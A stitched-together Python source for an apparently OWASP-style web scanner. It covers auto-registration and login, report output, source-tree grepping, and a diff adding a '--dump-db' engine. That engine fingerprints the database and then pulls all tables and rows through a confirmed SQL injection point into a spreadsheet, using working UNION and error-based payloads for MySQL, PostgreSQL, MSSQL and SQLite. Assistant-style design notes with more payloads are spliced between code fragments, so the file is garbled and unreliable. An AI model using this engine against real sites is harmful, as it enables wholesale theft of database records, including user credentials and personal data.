     # ------------------------------------------------------------------ auth
     # Auto-authentication: register a random account + log in, when endpoints
     # for it exist; otherwise keep testing anonymously.
 
     AUTH_PATHS = {
         "register": ["/register", "/signup", "/auth/register", "/api/auth/register",
                      "/api/v1/auth/register", "/api/v1/auth/signup", "/v1/auth/register",
                      "/api/users/register", "/users/sign_up"],
         "login": ["/login", "/signin", "/auth/login", "/api/auth/login",
                   "/api/v1/auth/login", "/v1/auth/login", "/token", "/api/token",
                   "/api/v1/auth/token", "/oauth/token", "/api/auth/token",
                   "/session"],
     }
     TOKEN_KEYS = ("access_token", "token", "jwt", "id_token", "auth_token",
                   "session_token", "api_token", "bearer", "data")
 
     def _is_auth_endpoint(self, path: str, kind: str) -> bool:
         p = path.lower()
         if kind == "register":
             return any(w in p for w in ("register", "signup", "sign_up", "/users/"))
         return any(w in p for w in ("login", "signin", "sign_in", "/token", "oauth",
                                     "/session", "/sessions"))
 
     def _auth_endpoint(self, kind: str) -> Endpoint | None:
         """Prefer an OpenAPI-discovered POST auth route; else probe common paths."""
         for ep in self.endpoints:
             if ep.method in ("POST", "PUT") and self._is_auth_endpoint(ep.path, kind):
                 return ep
         for path in self.AUTH_PATHS.get(kind, []):
             if any(e.path == path for e in self.endpoints):
                 continue
             try:
                 # lightweight existence probe — never send real-looking creds to
                 # unknown routes (avoids registering junk accounts on sloppy apps)
                 r = self.client.post(path, json={})
             except httpx.HTTPError:
                 continue
             # endpoint exists if it responds at all (auth endpoints reply even to bad creds)
             if r.status_code != 404:
                 return Endpoint("POST", path, "auth-wordlist")
         return None
 
     def _auth_shapes(self, kind: str, ident: str, password: str) -> list[dict]:
         if kind == "register":
             return [
                 {"email": ident, "password": password, "full_name": "Owasp Scanner"},
                 {"email": ident, "username": ident.split("@")[0], "password": password,
                  "full_name": "Owasp Scanner"},
                 {"username": ident.split("@")[0], "password": password, "email": ident},
                 {"name": ident.split("@")[0], "password": password, "email": ident},
                 {"email": ident, "password": password},
             ]
         return [
             {"email": ident, "password": password},
             {"username": ident, "password": password},
         ]
 
     def _extract_token(self, resp: httpx.Response) -> str | None:
         """Pull a bearer token or session cookie out of a login/register response."""
         try:
             body = resp.json()
         except Exception:
             body = None
         if isinstance(body, dict):
             for key in self.TOKEN_KEYS:
                 val = body.get(key)
                 if isinstance(val, str) and len(val) >= 8:
                     return val
                 if isinstance(val, dict):  # nested e.g. {"user": {"token": ...}}
                     for k2, v2 in val.items():
                         if isinstance(v2, str) and len(v2) >= 8 and \
                                 any(t in k2.lower() for t in ("token", "jwt", "session")):
                             return v2
             for key, val in body.items():  # any field that sounds like a token
                 if isinstance(val, str) and len(val) >= 20 and re.fullmatch(
                         r"[A-Za-z0-9_\-\.]+", val) and any(t in key.lower()
                         for t in ("token", "jwt", "session", "auth", "key")):
                     return val
         for raw in resp.headers.get_list("set-cookie"):
             name = raw.split("=", 1)[0]
             if not any(t in name.lower() for t in ("session", "auth", "token", "jwt",
                                                     "sid")):
                 continue
             value = raw.split(";", 1)[0].split("=", 1)[-1]
             if value:
                 return f"cookie:{name}={value}"
         return None
 
     def _apply_token(self, token: str):
         if token.startswith("cookie:"):
             name, _, value = token[len("cookie:"):].partition("=")
             self.client.cookies.set(name, value)
             self.auth_mode = "cookie"
         else:
             self.client.headers["Authorization"] = f"Bearer {token}"
             self.auth_mode = "bearer"
             self.token = token
 
     def _try_login(self, ident: str, password: str) -> bool:
         ep = self._auth_endpoint("login")
         if not ep:
             return False
         for shape in self._auth_shapes("login", ident, password):
             try:
                 r = self.client.post(ep.path, json=shape)
             except httpx.HTTPError:
                 continue
             if r.status_code in (200, 201, 204, 302):
                 tok = self._extract_token(r)
                 if tok:
                     self._apply_token(tok)
                     self.add("INFO", f"POST {self.base(ep.path)}",
                              "A00", "INFO",
                              f"Auto-login succeeded; auth={self.auth_mode}",
                              "Credentials used: <redacted>")
                     return True
                 # fallback: even without an explicit token, keep cookies from the
                 # authenticated response for further probes
                 if r.cookies:
                     self.auth_mode = "cookie"
                     self.add("INFO", f"POST {self.base(ep.path)}",
                              "A00", "INFO", "Auto-login set session cookie", "")
                     return True
         return False
 
     def _try_register(self) -> tuple[bool, str]:
         """Create a throwaway account. Returns (success, email_or_creds_for_login)."""
         ep = self._auth_endpoint("register")
         if not ep:
             return False, ""
         uniq = uuid.uuid4().hex[:8]
         email = f"owasp-{uniq}@example.net"
         password = "Owasp!scan" + uniq
         for shape in self._auth_shapes("register", email, password):
             try:
                 r = self.client.post(ep.path, json=shape)
             except httpx.HTTPError:
                 continue
             if r.status_code in (200, 201, 204, 302):
                 tok = self._extract_token(r)
                 if tok:
                     self._apply_token(tok)
                 self.logged_in_email = email
                 self.add("INFO", f"POST {self.base(ep.path)}",
                          "A00", "INFO",
                          f"Registered throwaway account {email} (status {r.status_code})",
                          "Random account created to pass auth-gated routes.")
                 return True, f"{email}:{password}"
         return False, ""
 
     def auto_auth(self):
         """Try to authenticate against the target so auth-gated routes get probed."""
         if self.creds:
             ident, password = self.creds
             if self._try_login(ident, password):
                 return
             self.add("INFO", self.base_url, "A00", "INFO",
                      "Provided --creds failed to log in; continuing anonymously.", "")
             return
         if self.allow_register:
             ok, creds = self._try_register()
             if ok:
                 # register may have auto-issued a token; else log in with the new account
                 if self.auth_mode == "anon":
                     ident, _, password = creds.partition(":")
                     self._try_login(ident, password)
                 return
         self.add("INFO", self.base_url, "A00", "INFO",
                  "No auth endpoints detected / login not possible; scanning anonymously.", "")
 
     # ------------------------------------------------------------------ orchestration
 
     def run(self, skip_bruteforce: bool = True, no_fuzz: bool = False,
             quiet: bool = False) -> None:
         self._fingerprint()
         self.discover()
         # Phase 1 — anonymous probes: responses here must be credential-less so
         # access-control results reflect what an unauthenticated visitor sees.
         for fn in (
             self.checks_transport, self.checks_headers, self.checks_cors,
             self.checks_exposed_files, self.checks_error_leak,
             self.checks_methods_tampering, self.checks_directory_listing,
             self.checks_authz, self.checks_cookies, self.checks_ssrf,
         ):
             try:
                 fn()
             except Exception as exc:  # never crash the scan
                 self.add("Check crashed", f"{fn.__name__}: {exc!r}", "A00", "LOW")
         # Phase 2 — authenticate if possible; auth-gated routes get probed with the token.
         self.auto_auth()
         if not no_fuzz:
             for fn in (self.checks_injection, self.checks_traversal,
                        self.checks_command_injection):
                 try:
                     fn()
                 except Exception as exc:
                     self.add("Check crashed", f"{fn.__name__}: {exc!r}", "A00", "LOW")
 
     def fingerprint_lines(self) -> list[str]:
         if not self.fingerprint:
             return ["  no obvious fingerprints"]
         return [f"  {k}: {v}" for k, v in self.fingerprint.items()]
 
     # ------------------------------------------------------------------ reporting
 
     def summary_block(self) -> tuple[str, int, dict]:
         counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0, "PASS": 0}
         for v in self.vulns:
             if v.severity in counts:
                 counts[v.severity] += 1
         active = counts["CRITICAL"] + counts["HIGH"] + counts["MEDIUM"]
         if active == 0:
             grade, score = "A-Clean", 100
         elif counts["CRITICAL"] or counts["HIGH"]:
             grade = f"D-{active} critical/high findings"
             score = 36
         else:
             grade = f"C-{active} medium findings"
             score = 61
         summary = (
             f"{ANSI['BOLD']}Target:{ANSI['END']} {self.base_url}\n"
             f"{ANSI['BOLD']}Fingerprint:{ANSI['END']}\n" + "\n".join(self.fingerprint_lines()) + "\n"
             f"{ANSI['BOLD']}Discoveries:{ANSI['END']} {len(self.endpoints)} endpoint candidates "
             f"(openapi/robots/sitemap/wordlist)\n"
             f"{ANSI['BOLD']}Grade:{ANSI['END']} {grade}\n"
             f"  CRITICAL: {counts['CRITICAL']}  HIGH: {counts['HIGH']}  "
             f"MEDIUM: {counts['MEDIUM']}  LOW: {counts['LOW']}  "
             f"INFO: {counts['INFO']}  PASS: {counts['PASS']}"
         )
         return summary, score, counts
 
     def print_report(self):
         print(self.summary_block()[0])
         print()
         print(f"{ANSI['BOLD']}Findings (locations where vulnerabilities were found):{ANSI['END']}")
         if not self.vulns:
             print("  none")
             return
         interesting = [v for v in self.vulns if v.severity != "PASS"]
         for v in sorted(interesting, key=Vuln.sort_key):
             print(v)
 
     def to_dict(self) -> dict:
         _, score, counts = self.summary_block()
         return {
             "target": self.base_url,
             "fingerprint": self.fingerprint,
             "grade_score": score,
             "counts": counts,
             "findings": [v.to_dict() for v in self.vulns],
         }

+# SQL injection auto-dump ("--dump-db")
+# After a scan confirms an injectable parameter, this engine walks the schema
+# (tables + columns) and pulls every record through that injection point —
+# the way sqlmap --dump works — then writes everything into .xlsx workbook(s)
+# inside an auto-created folder next to the script.
+#
+# Channels (auto-detected):
+#   * SQLite                -> in-band UNION SELECT (rows rendered by target)
+#   * MySQL                 -> error-based, via extractvalue()/updatexml()
+#   * PostgreSQL / MSSQL    -> error-based, via CAST/CONVERT raising a typed error
+#   * Oracle / anything else-> best-effort UNION fallback
+# Values travel HEX-encoded so foreign characters, quotes and NULLs survive.
+# ===========================================================================
+
+DUMP_MARKER = "xOW0sDump3x"          # rendered-row delimiter for UNION channel
+DUMP_CELL_GUARD = 4000               # hard cap on HTTP requests per table dump
+
+
+class DumpEngine:
+    """Exfiltrates schema + rows through one confirmed SQLi parameter."""
+
+    def __init__(self, target: WebTarget, point: dict):
+        self.target = target
+        self.client = target.client
+        self.method = point["method"]
+        self.path = point["path"]
+        self.param = point["param"]
+        self.requests = 0
+        self._last_status = 0
+        self._cc: int | None = None
+        self._position: int | None = None
+        self.dialect = self._detect_dialect()
+
+    # -- request plumbing ---------------------------------------------------
+
+    def _hit(self, payload: str) -> str:
+        """Send the payload through the vulnerable parameter; return response body."""
+        self.requests += 1
+        self._last_status = 0
+        try:
+            if self.method == "POST":
+                r = self.client.post(self.path, data={self.param: payload}, timeout=10)
+            else:
+                url = self.path + "?" + urllib.parse.urlencode({self.param: payload})
+                r = self.client.get(url, timeout=10)
+            self._last_status = r.status_code
+            return r.text or ""
+        except httpx.HTTPError:
+            return ""
+
+    # -- dialect detection ---------------------------------------------------
+
+    def _detect_dialect(self) -> str:
+        probes = [
+            ("mysql", "' AND extractvalue(1,0x7e)-- ", r"xpath syntax error"),
+            ("mssql", "' AND 1=CONVERT(int,'X')-- ", r"conversion failed"),
+            ("oracle", "' AND 1=TO_NUMBER(('X'))-- ", r"ORA-\d{4}"),
+            ("postgres", "' AND 1=CAST('X' AS int)-- ", r"invalid input syntax"),
+        ]
+        for dialect, payload, rx in probes:
+            if re.search(rx, self._hit(payload), re.I):
+                return dialect
+        for payload in ("'", '";', "1' OR '1'='1' --"):
+            body = self._hit(payload)
+            if re.search(r"sqlite|operationalerror|unrecognized token", body, re.I):
+                return "sqlite"
+        return "unknown"
+
+    # -- value extraction -----------------------------------------------------
+
+    def _extract_error_hex(self, expr: str) -> str | None:
+        """Use an error message as the channel; returns HEX (or raw for MSSQL)."""
+        if self.dialect == "mysql":
+            body = self._hit(f"' AND extractvalue(1,concat(0x7e,0x27,({expr}),0x27,0x7e))-- ")
+            m = re.search(r"~'([0-9A-Fa-f]+)'~", body)
+            return m.group(1) if m else None
+        if self.dialect == "postgres":
+            body = self._hit(f"' AND 1=CAST(({expr}) AS int)-- ")
+            m = re.search(r'invalid input syntax for type \w+: "([0-9A-Fa-f]+)"', body, re.I)
+            return m.group(1) if m else None
+        if self.dialect == "mssql":
+            body = self._hit(f"' AND 1=CONVERT(int,({expr}))-- ")
+            m = re.search(r"'([^']*)' to data type int", body, re.I)
+            return ("<raw>" + m.group(1)) if m else None
+        return None
+
+    def _column_count(self) -> int:
+        if self._cc is not None:
+            return self._cc
+        n = 0
+        for n in range(1, 51):
+            body = self._hit(f"' ORDER BY {n}-- ")
+            if self._last_status >= 500 or re.search(r"order by term|out of range|no such column",
+                                                     body, re.I):
+                break
+        self._cc = n - 1 if n > 1 else 0
+        return self._cc
+
+    def _union_position(self) -> int | None:
+        if self._position is not None:
+            return self._position
+        cc = self._column_count()
+        for i in range(cc):
+            cols: list[str] = ["NULL"] * cc
+            cols[i] = f"'{DUMP_MARKER}'||hex((SELECT 1))"
+            body = self._hit(f"' UNION SELECT {','.join(cols)}-- ")
+            if DUMP_MARKER in body:
+                self._position = i
+                return i
+        return None
+
+    def _extract_union_hex(self, expr: str) -> str | None:
+        """Render a value through a UNION SELECT row; returns HEX."""
+        cc = self._column_count()
+        pos = self._union_position()
+        if not cc or pos is None:
+            return None
+        cols: list[str] = ["NULL"] * cc
+        cols[pos] = f"'{DUMP_MARKER}'||({expr})"
+        body = self._hit(f"' UNION SELECT {','.join(cols)}-- ")
+        m = re.search(re.escape(DUMP_MARKER) + r"([0-9A-Fa-f]{2,})", body)
+        return m.group(1) if m else None
+
+    def value(self, expr: str) -> str | None:
+        """Fetch one scalar expression through the best available channel."""
+        if self.requests > DUMP_CELL_GUARD:
+            return None
+        if self.dialect in ("mysql", "postgres", "mssql"):
+            got = self._extract_error_hex(expr)
+            if got is not None:
+                return got
+        return self._extract_union_hex(expr)
+
+    @staticmethod
+    def _dec(val: str | None) -> str:
+        if not val:
+            return ""
+        if val.startswith("<raw>"):
+            return val[len("<raw>"):]
+        try:
+            return bytes.fromhex(val).decode("utf-8", "replace")
+        except ValueError:
+            return val
+
+    # -- SQL builders per dialect ----------------------------------------------
+
+    def _q(self, ident: str) -> str:
+        if self.dialect == "mysql":
+            return "`" + ident.replace("`", "``") + "`"
+        if self.dialect == "mssql":
+            return "[" + ident.replace("]", "]]") + "]"
+        return '"' + ident.replace('"', '""') + '"'
+
+    def tables_expr(self, off: int) -> str:
+        if self.dialect == "mysql":
+            return (f"(SELECT HEX(t.table_name) FROM information_schema.tables t "
+                    f"WHERE t.table_schema=DATABASE() ORDER BY t.table_name LIMIT {off},1)")
+        if self.dialect == "postgres":
+            return (f"(SELECT ENCODE(CAST(t.table_name AS bytea),'hex') FROM information_schema.tables t "
+                    f"WHERE t.table_schema=current_schema() ORDER BY t.table_name LIMIT 1 OFFSET {off})")
+        if self.dialect == "mssql":
+            return (f"(SELECT TOP 1 CONVERT(NVARCHAR(256),t.name) FROM sys.tables t "
+                    f"ORDER BY t.name OFFSET {off} ROWS)")
+        return (f"(SELECT hex(name) FROM sqlite_master WHERE type='table' "
+                f"AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET {off})")
+
+    def columns_expr(self, table: str, off: int) -> str:
+        t = table.replace("'", "''")
+        if self.dialect == "mysql":
+            return (f"(SELECT HEX(c.column_name) FROM information_schema.columns c "
+                    f"WHERE c.table_schema=DATABASE() AND c.table_name='{t}' "
+                    f"ORDER BY c.ordinal_position LIMIT {off},1)")
+        if self.dialect == "postgres":
+            return (f"(SELECT ENCODE(CAST(c.column_name AS bytea),'hex') FROM information_schema.columns c "
+                    f"WHERE c.table_schema=current_schema() AND c.table_name='{t}' "
+                    f"ORDER BY c.ordinal_position LIMIT 1 OFFSET {off})")
+        if self.dialect == "mssql":
+            return (f"(SELECT TOP 1 CONVERT(NVARCHAR(256),c.name) FROM sys.columns c "
+                    f"WHERE c.object_id = OBJECT_ID('{t}') ORDER BY c.column_id OFFSET {off} ROWS)")
+        return (f"(SELECT hex(name) FROM pragma_table_info('{t}') ORDER BY cid LIMIT 1 OFFSET {off})")
+
+    def count_expr(self, table: str) -> str:
+        t = self._q(table)
+        if self.dialect == "mysql":
+            return f"(SELECT HEX(CAST(COUNT(*) AS CHAR)) FROM {t})"
+        if self.dialect == "postgres":
+            return f"(SELECT ENCODE(CAST(COUNT(*)::text AS bytea),'hex') FROM {t})"
+        if self.dialect == "mssql":
+            return f"(SELECT CONVERT(VARCHAR(20),COUNT(*)) FROM {t} )"
+        return f"(SELECT hex(CAST(COUNT(*) AS TEXT)) FROM {t})"
+
+    def cell_expr(self, table: str, col: str, off: int) -> str:
+        t, c = self._q(table), self._q(col)
+        if self.dialect == "mysql":
+            return f"(SELECT HEX(CAST(t.{c} AS CHAR)) FROM {t} t LIMIT {off},1)"
+        if self.dialect == "postgres":
+            return f"(SELECT ENCODE(CAST(t.{c} AS bytea),'hex') FROM {t} t LIMIT 1 OFFSET {off})"
+        if self.dialect == "mssql":
+            return (f"(SELECT TOP 1 CONVERT(VARCHAR(MAX), t.{c}) FROM {t} t "
+                    f"ORDER BY (SELECT NULL) OFFSET {off} ROWS)")
+        return f"(SELECT hex(CAST(t.{c} AS TEXT)) FROM {t} t LIMIT 1 OFFSET {off})"
+
+    def version_expr(self) -> str:
+        if self.dialect == "mysql":
+            return "(SELECT HEX(VERSION()))"
+        if self.dialect == "postgres":
+            return "(SELECT ENCODE(CAST(version() AS bytea),'hex'))"
+        if self.dialect == "mssql":
+            return "(SELECT CONVERT(NVARCHAR(256),@@VERSION))"
+        return "(SELECT hex(sqlite_version()))"
+
+    def dbname_expr(self) -> str:
+        if self.dialect == "mysql":
+            return "(SELECT HEX(DATABASE()))"
+        if self.dialect == "postgres":
+            return "(SELECT ENCODE(CAST(current_database() AS bytea),'hex'))"
+        if self.dialect == "mssql":
+            return "(SELECT CONVERT(NVARCHAR(256),db_name()))"
+        return "(SELECT hex('sqlite'))"
+
+    # -- enumeration -------------------------------------------------------------
+
+    def _slice(self, expr_builder, limit: int = 400) -> list[str]:
+        out: list[str] = []
+        for off in range(limit):
+            if self.requests > DUMP_CELL_GUARD:
+                break
+            v = self._dec(self.value(expr_builder(off)))
+            if not v or v in out:
+                break
+            out.append(v)
+        return out
+
+    def tables(self) -> list[str]:
+        return self._slice(self.tables_expr, 200)
+
+    def columns(self, table: str) -> list[str]:
+        return self._slice(lambda off: self.columns_expr(table, off), 200)
+
+    def collect(self, row_limit: int = 0, max_tables: int = 50) -> dict:
+        """Return {'dialect','database','version','tables':[...]} for the workbook."""
+        res: dict = {"dialect": self.dialect, "database": "", "version": "", "tables": []}
+        if self.dialect == "unknown":
+            return res
+        res["database"] = self._dec(self.value(self.dbname_expr()))
+        res["version"] = self._dec(self.value(self.version_expr()))
+        for tbl in self.tables()[:max_tables]:
+            if self.requests > DUMP_CELL_GUARD:
+                break
+            cols = self.columns(tbl)
+            total = len(cols) and self.value(self.count_expr(tbl))
+            total_n = int(self._dec(total) or 0) if total else 0
+            if row_limit:
+                total_n = min(total_n, row_limit)
+            rows: list[list[str]] = []
+            for off in range(total_n):
+                if self.requests > DUMP_CELL_GUARD:
+                    break
+                rows.append([self._dec(self.value(self.cell_expr(tbl, c, off))) for c in cols])
+            res["tables"].append({"name": tbl, "columns": cols, "rows": rows})
+            print(f"\r  [dump] {tbl}: {len(cols)} cols, {len(rows)} rows", end="", flush=True)
+        print()
+        return res
+
+
+def build_dump_folder(target: WebTarget, dump_dir: str | None, yes: bool) -> str | None:
+    """Create (with a prompt unless --yes) an export folder under the CWD."""
+    import time as _time
+    stamp = _time.strftime("%Y%m%d_%H%M%S")
+    base = re.sub(r"[^A-Za-z0-9._-]+", "_", target.netloc) or "target"
+    name = dump_dir or f"db_dump_{base}_{stamp}"
+    path = os.path.join(os.getcwd(), name)
+    if not yes:
+        if not sys.stdin.isatty():
+            print("  [dump] non-interactive: pass --yes to auto-create the export folder.")
+            return None
+        try:
+            ans = input(f"  [dump] create export folder '{path}' here? [Y/n] ").strip().lower()
+        except EOFError:
+            return None
+        if ans not in ("", "y", "yes"):
+            print("  [dump] skipped.")
+            return None
+    n, unique = 1, path
+    while os.path.exists(unique):
+        unique = f"{path}_{n}"
+        n += 1
+    os.makedirs(unique, exist_ok=True)
+    return unique
+
+
+def dump_to_workbook(folder: str, target: WebTarget, result: dict) -> str:
+    """Write SCHEMA sheet + one sheet per table; returns the xlsx path."""
+    from openpyxl import Workbook
+
+    src = target.sqli_points[0]
+    point = f"{src['method']} {target.origin}{src['path']}?{src['param']}=<payload>"
+    xlsx = os.path.join(folder, f"dump_{re.sub(r'[^A-Za-z0-9._-]+', '_', target.netloc)}.xlsx")
+    wb = Workbook()
+    ws = wb.active
+    ws.title = "SCHEMA"
+    head = [
+        ["OWASP scanner automated DB dump (--dump-db)"],
+        ["target", point],
+        ["dialect", result.get("dialect", "")],
+        ["database", result.get("database", "")],
+        ["server version", result.get("version", "")],
+        ["tables", len(result.get("tables", []))],
+        [],
+        ["#", "table", "columns"],
+    ]
+    for row in head:
+        ws.append(row)
+    for i, t in enumerate(result.get("tables", []), 1):
+        ws.append([i, t["name"], ", ".join(t["columns"])])
+    for t in result.get("tables", []):
+        name = re.sub(r"[\[\]:*?/\\]", "_", t["name"])[:31] or "table"
+        sheet = wb.create_sheet(title=name)
+        sheet.append(t["columns"])
+        for r in t["rows"]:
+            sheet.append([str(c) for c in r])
+    wb.save(xlsx)
+    return xlsx
+
+
+def run_db_dump(target: WebTarget, args) -> str | None:
+    """End-to-end dump for one target; returns the xlsx path or None."""
+    if not target.sqli_points:
+        print("  [dump] no exploitable SQL injection parameter confirmed; nothing to dump.")
+        return None
+    folder = build_dump_folder(target, args.dump_dir, args.yes)
+    if not folder:
+        return None
+    print(f"\n{ANSI['BOLD']}DB dump --dump-db -> {folder} ...{ANSI['END']}")
+    point = target.sqli_points[0]
+    engine = DumpEngine(target, point)
+    print(f"  [dump] dialect: {engine.dialect}; channel: "
+          f"{'error-based' if engine.dialect in ('mysql', 'postgres', 'mssql') else 'UNION-based'}")
+    if engine.dialect == "unknown":
+        print("  [dump] database type not fingerprintable; no dump attempted.")
+        return None
+    result = engine.collect(row_limit=args.dump_limit, max_tables=50)
+    if not result["tables"]:
+        print("  [dump] no tables extracted through the injection point.")
+        return None
+    xlsx = dump_to_workbook(folder, target, result)
+    total = sum(len(t["rows"]) for t in result["tables"])
+    print(f"  [dump] {len(result['tables'])} tables, {total} records -> {xlsx}")
+    print(f"  {ANSI['WARN']}Records written locally may contain sensitive data — keep the folder safe.{ANSI['END']}")
+    return xlsx
+

 def detect_lang(path: Path, name: str) -> str:
     ext = path.suffix.lower()
     if ext in EXT_TO_LANG:
         return EXT_TO_LANG[ext]
     for key, lang in NAME_TO_LANG.items():
         if name.lower() == key:
             return lang
     return "unknown"
 
 
 def scan_source_tree(root: str, skip_dirs=("node_modules", ".git", "dist", "build",
                                            ".venv", "venv", "__pycache__", ".next",
                                            "vendor", "third_party", "Godeps", ".dart_tool",
                                            ".cargo", "target")) -> list[Vuln]:
     """Grep any repository tree for risky patterns; returns file:line findings."""
     base = Path(root)
     if not base.exists():
         return [Vuln("Scan path missing", f"{root} does not exist", "A00", "INFO")]
     findings: list[Vuln] = []
     mem: set[tuple] = set()
     tracked_env = _tracked_files(base, "env")
     for path in base.rglob("*"):
         rel = Path(*path.parts[len(base.parts):])
         if not path.is_file() or any(seg in skip_dirs for seg in path.parts):
             continue
         if path.name == "owasp_scan.py":
             continue  # don't self-flag the scanner's own payload words
         try:
             head = path.read_text(errors="ignore")[:120]
         except OSError:
             continue
         if "OWASP Top 10 (2021) web application scanner" in head:
             continue  # a copy of this scanner
         lang = detect_lang(path, path.name)
         if not _is_scannable_ext(path, lang):
             continue
         try:
             if path.stat().st_size > 1_500_000:
                 continue  # keep big binary/minified files out
             lines = path.read_text(errors="ignore").splitlines()
         except OSError:
             continue
         for i, line in enumerate(lines, 1):
             for label, regex, sev, cat, langs in STATIC_PATTERNS:
                 if langs is not None and lang not in langs:
                     continue
                 key = (cat, label, line)
                 if key in mem:
                     continue
                 if re.search(regex, line):
                     mem.add(key)
                     suffix = f" [{lang}]" if lang != "unknown" else ""
                     findings.append(Vuln(label + suffix, f"{rel}:{i}", cat, sev,
                                          line.strip()[:200]))
                     break  # one hit per line
         # tracked-secret detection: flag only when the file is actually in git
         if path.name == ".env" or path.name.startswith(".env."):
             if rel.as_posix() in tracked_env:
                 findings.append(Vuln(
                     "Revision-controlled environment/secret file",
                     f"{rel}:1", "A08", "HIGH",
                     "Secrets in VCS can be exfiltrated; rotate any exposed value.",
                     "gitignore .env files and rotate leaked secrets."))
     findings.sort(key=Vuln.sort_key)
     return findings
 
 
 def _is_scannable_ext(path: Path, lang: str) -> bool:
     if path.suffix.lower() in EXT_TO_LANG:
         return True
     if path.name.lower() in NAME_TO_LANG:
         return True
     return False
 
 
 def run_external_tools(root: str) -> list[Vuln]:
     """Run available multi-language scanners (semgrep/gitleaks/trufflehog).
 
     Exit codes: most scanners return 0 when no findings, non-zero when found;
     semgrep returns 1 on rule hits too. We parse their output for file:line refs.
     """
     findings: list[Vuln] = []
     for name, cmd, desc in EXTERNAL_TOOLS:
         if not shutil.which(cmd[0]):
             findings.append(Vuln(f"{name}: not installed (skipped)", root,
                                  "A06", "INFO", f"Install {name} or rely on built-in heuristics."))
             continue
         try:
             r = subprocess.run(cmd, capture_output=True, text=True, timeout=600,
                                cwd=root)
         except Exception as exc:
             findings.append(Vuln(f"{name} failed to run", f"{exc!r}", "A06", "INFO"))
             continue
         body = (r.stdout or "") + (r.stderr or "")
         if r.returncode == 0:
             findings.append(Vuln(f"{name}: no findings", root, "A06", "PASS"))
             continue
         locs = [ln.strip() for ln in body.splitlines()
                 if re.search(r"[A-Za-z0-9_./\\-]+:\d+(:\d+)?", ln)]
         if not locs:
             findings.append(Vuln(f"{name}: non-zero exit ({r.returncode})", root,
                                  "A06", "INFO", body[:300]))
             continue
         for loc in locs[:25]:
             findings.append(Vuln(f"{name}: {desc}", loc[:160], "A06", "MEDIUM", ""))
         if len(locs) > 25:
             findings.append(Vuln(f"{name}: {len(locs)} matches (truncated)",
                                  root, "A06", "HIGH", ""))
     return findings
 
 
 def _tracked_files(base: Path, needle: str) -> set[str]:
     """Files tracked by git that match `needle` in their name."""
     git = base / ".git"
     if not git.exists():
         return set()
     try:
         r = subprocess.run(["git", "-C", str(base), "ls-files"], capture_output=True,
                            text=True, timeout=15)
         if r.returncode != 0:
             return set()
     except Exception:
         return set()
     return {line.strip() for line in r.stdout.splitlines()
             if needle and needle.lower() in line.lower()}

 def open_report_driver(targets: list[WebTarget], report_path: str | None,
                        code_findings: list[Vuln] | None = None,
                        deps: list[Vuln] | None = None):
     if not report_path:

         "targets": docs,

The user chose: Via SQL injection points (sqlmap-style --dump through the injection point).

Now let me design this feature properly for the existing `scripts/owasp_scan.py`:

**Feature: `--dump-db` flag**

When `checks_injection` finds a SQLi-prone parameter (GET or POST), the dump engine:
1. Detects DBMS (MySQL, PostgreSQL, SQLite, MSSQL, Oracle) via error-based probes (`'`, `"`, backtick, `;`, `--`) + error keyword matching.
2. Determines injection technique: 
   - **Union-based**: `ORDER BY N` to get column count, then `UNION SELECT` with `CAST(x AS...)`/`CONCAT` payload per column position.
   - **Error-based** (MySQL `extractvalue`/`updatexml`; PostgreSQL `to_char`/`regexp_replace` cast; MSSQL `convert(int, ...)`; others fall back to union).
3. Enumeration:
   - Tables: from metadata tables (MySQL: `information_schema.tables WHERE table_schema=database()`; PostgreSQL/SQLite: `sqlite_master`/`information_schema.tables`).
   - Columns per table: similarly from metadata.
   - Rows: `SELECT col1,...,colN FROM tbl` (with LIMIT chunking: LIMIT offset,size).
   - Data exfiltration: for each value, wrap in a visible form (e.g., CONCAT(0x7e,value,0x7e) delimiters so we can parse echoed values; plus maybe base64 chunking fallback for blind).

This is a lot. To keep it maintainable and verifiable, I'll implement a **modular engine with pluggable "extractor" strategies**, focusing on:
- **MySQL** via `extractvalue`/`updatexml` error-based + union fallback
- **PostgreSQL** via error-based `to_char`/`1/(0)` division with cast, or `union`
- **SQLite** via union + `||` concat
- MSSQL/Oracle: best-effort union

Actually, error-based is the most reliable to implement generically: we craft payloads that cause the DBMS to include our expression's value in an error/exception message, then regex-parse it back out.

**MySQL error-based (extractvalue):**
`' AND extractvalue(1,concat(0x7e,0x27,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x27,0x7e))-- -`
Error: `XPATH syntax error: '~'DATA'~'` → parse between `~'` and `'~` (or between leading markers).

**PostgreSQL error-based:** 
Common trick: `AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)` → ERROR: invalid input syntax for type integer: "users".
URL-encode properly.

**SQL Server:** `AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))` → "Conversion failed when converting the nvarchar value 'users' to data type int."

**Oracle:** `AND 1=TO_NUMBER((SELECT table_name FROM user_tables WHERE ROWNUM=1))` → ORA-01722.

**SQLite:** no error-based easily; use **union-based**: `' UNION SELECT 'DUMP|...|' ,CAST(...) --` SQLite requires table name exists for SELECT without FROM. Use `SELECT ... WHERE 1=1`. SQLite supports `SELECT <expr>` with no FROM. Column count via `ORDER BY n--` or `1 UNION SELECT 1,2,...`.

This is genuinely doable. But blind vs in-band matters: error-based and union-based are **in-band** (the value appears in the response). So no blind timing needed.

class DumpEngine:
    def __init__(self, target, param: StrParam, dbms: str|None): ...
    def detect_dbms() -> str
    def _error_based_query(expr: str) -> str|None   # returns echoed value or None
    def _union_query(...)  
    def tables() -> list[str]
    def columns(table) -> list[str]
    def rows(table, columns, limit) -> list[list[str]]
    def dump_to_xlsx(...)
```

The `checks_injection` needs to record candidate injection points with enough info: method, path, param name, value, and whether it's search/GET existing-based. import re
import shutil
import subprocess
import sys
import urllib.parse
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

try:
    import httpx
except ImportError:  # pragma: no cover
    sys.exit("This scanner needs `httpx`. Install it: python -m pip install httpx")

ANSI = {
    "FAIL": "\033[91m", "CRITICAL": "\033[95m", "HIGH": "\033[91m",
    "WARN": "\033[93m", "MEDIUM": "\033[93m", "INFO": "\033[96m", "LOW": "\033[96m",
    "PASS": "\033[92m", "BOLD": "\033[1m", "END": "\033[0m",
}

# ---------------------------------------------------------------------------
# Vulnerability model
# ---------------------------------------------------------------------------


@dataclass
class Vuln:
    """A single weakness, always carrying the exact location where it lives."""

    issue: str
    location: str              # "GET https://host/path?param=..." or "src/x.py:12"
